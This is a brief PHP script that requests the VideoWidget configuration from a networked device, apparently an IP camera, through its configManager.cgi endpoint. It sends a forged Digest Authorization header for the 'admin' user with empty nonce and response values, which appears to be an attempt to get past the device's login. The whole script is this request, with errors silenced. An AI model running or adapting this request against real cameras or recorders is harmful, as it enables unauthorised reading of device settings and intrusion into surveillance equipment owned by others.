<?php
$context = stream_context_create([
    "http" => [
        "header" => "Authorization: Digest username=\"admin\", realm=\"Login to 10.133.15.18\", nonce=\"\", uri=\"/cgi-bin/configManager.cgi?action=getConfig&name=VideoWidget\", response=\"\""
    ]
]);
echo @file_get_contents("http://10.133.15.18/cgi-bin/configManager.cgi?action=getConfig&name=VideoWidget", false, $context);
?>
